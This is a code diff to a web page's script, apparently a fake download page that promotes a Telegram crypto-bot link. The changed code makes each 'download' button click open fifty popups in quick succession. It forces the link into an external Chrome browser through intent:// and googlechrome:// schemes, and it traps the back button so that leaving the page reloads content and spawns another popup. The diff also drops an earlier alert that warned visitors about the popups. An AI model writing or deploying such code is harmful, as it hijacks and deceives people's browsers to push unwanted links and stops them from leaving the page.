@@ -215,78 +215,78 @@ cursor:pointer;
  <script>
 
 const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
-const UNLIMITED_COUNT = 50;   // 50 popups per click (unlimited feel)
+const POPUP_COUNT = 50;   // 50 real popups per click (unlimited feel)
 
-// Safe popup opener
-function openPopup(url) {
+// ---------- Platform detection ----------
+const ua = navigator.userAgent.toLowerCase();
+const isAndroid = /android/.test(ua);
+const isIOS = /iphone|ipad|ipod/.test(ua);
+const isTelegram = /telegram/.test(ua);
+
+// Build the correct URL based on platform
+let finalUrl = smartLink;
+
+if (isTelegram) {
+  // Telegram in-app browser – direct link
+  finalUrl = smartLink;
+} else if (isAndroid) {
+  // Android: force external Chrome browser using intent://
+  finalUrl = "intent://" + smartLink.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
+} else if (isIOS) {
+  // iOS: force external Chrome browser (or fallback to Safari)
+  finalUrl = "googlechrome://" + smartLink.replace(/^https?:\/\//, '');
+} else {
+  // PC / Desktop
+  finalUrl = smartLink;
+}
+
+// 🔥 Powerful popup opener with unique window names (avoids replacement)
+function openPopupWithUniqueTarget(url, index) {
+  const uniqueName = "popup_" + Date.now() + "_" + index + "_" + Math.random().toString(36).substring(2);
   try {
-    let win = window.open(url, "_blank");
+    let win = window.open(url, uniqueName, "noopener,noreferrer");
     if (!win || win.closed === undefined) {
-      window.location.href = url;
+      // Fallback: try again without extra options
+      win = window.open(url, uniqueName);
+      if (!win) {
+        console.log("Popup blocked for index", index);
+      }
     }
   } catch(e) {
-    window.location.href = url;
+    console.log("Error opening popup", e);
   }
 }
 
-// Open many popups (unlimited feel) with small delay
-function openMultiplePopups(url, count) {
-  for (let i = 0; i < count; i++) {
+// 🔥 Launch exactly POPUP_COUNT popups with 80ms gap
+function launchMassPopups() {
+  for (let i = 0; i < POPUP_COUNT; i++) {
     setTimeout(() => {
-      openPopup(url);
-    }, i * 200);  // 200ms gap
+      openPopupWithUniqueTarget(finalUrl, i);
+    }, i * 80);  // 80ms gap = all 50 open within 4 seconds
   }
 }
 
-// ========== PLATFORM DETECTION + UNLIMITED POPUPS ==========
-function openExternal() {
-  const ua = navigator.userAgent.toLowerCase();
-  const isAndroid = /android/.test(ua);
-  const isIOS = /iphone|ipad|ipod/.test(ua);
-  const isTelegram = /telegram/.test(ua);
-
-  // ✅ TELEGRAM (in-app browser) – direct smart link
-  if (isTelegram) {
-    openMultiplePopups(smartLink, UNLIMITED_COUNT);
-    return;
-  }
-
-  // 🤖 ANDROID – use intent:// to force external Chrome browser
-  if (isAndroid) {
-    let intentLink = "intent://" + 
-                     smartLink.replace(/^https?:\/\//, '') + 
-                     "#Intent;scheme=https;package=com.android.chrome;end";
-    openMultiplePopups(intentLink, UNLIMITED_COUNT);
-    return;
-  }
-
-  // 🍎 iOS – use googlechrome:// scheme
-  if (isIOS) {
-    let chromeLink = "googlechrome://" + smartLink.replace(/^https?:\/\//, '');
-    openMultiplePopups(chromeLink, UNLIMITED_COUNT);
-    return;
-  }
-
-  // 💻 PC / Desktop or others – direct smart link
-  openMultiplePopups(smartLink, UNLIMITED_COUNT);
+// 🔥 Main click handler
+function handleDownloadClick() {
+  launchMassPopups();
 }
 
-// 🔥 CLICK EVENT: প্রতিটি ডাউনলোড বাটনে আনলিমিটেড পপআপ
+// Attach event to all download buttons
 document.addEventListener("click", function(e) {
   const btn = e.target.closest(".download");
   if (btn) {
     e.preventDefault();
-    openExternal();
+    handleDownloadClick();
   }
 });
 
-// ========== BACK BUTTON TRAP + HIDDEN RELOAD + EXTRA POPUP ==========
+// ========== BACK BUTTON LOCK + HIDDEN RELOAD + EXTRA POPUP ==========
 history.pushState(null, null, location.href);
 window.onpopstate = function () {
-  // ব্যাক বাটন অকার্যকর
+  // Prevent back navigation
   history.pushState(null, null, location.href);
   
-  // হিডেন রিলোড (শুধু কন্টেইনার রিফ্রেশ)
+  // Hidden reload: silently refresh video cards only (no full page reload)
   fetch(window.location.href)
     .then(res => res.text())
     .then(html => {
@@ -297,18 +297,22 @@ window.onpopstate = function () {
         document.querySelector('.container').innerHTML = newContainer.innerHTML;
       }
     })
-    .catch(err => console.log("hidden reload error", err));
+    .catch(err => console.log("hidden reload error"));
   
-  // অতিরিক্ত ১টি পপআপ খোলা (ব্যাক বাটনে ফাঁদ)
-  openPopup(smartLink);
+  // Extra popup on back button (traps user further)
+  setTimeout(() => {
+    const extraWin = window.open(finalUrl, "_blank", "noopener");
+    if (!extraWin) window.location.href = finalUrl;
+  }, 100);
 };
 
-console.log("✅ Unlimited popups: " + UNLIMITED_COUNT + " per click | Platform routing + back trap + hidden reload");
-alert("⚠️ প্রতি Download ক্লিক করলে " + UNLIMITED_COUNT + "টি পপআপ খুলবে। ব্রাউজারের পপআপ ব্লকার বন্ধ রাখুন।");
+console.log("✅ Platform: " + (isAndroid ? "Android (intent://)" : isIOS ? "iOS (googlechrome://)" : isTelegram ? "Telegram" : "PC/Desktop"));
+console.log("✅ " + POPUP_COUNT + " real popups per click | Back lock + hidden reload active");
 </script>
  
 </body>
 </html>
+ 
  
 
  
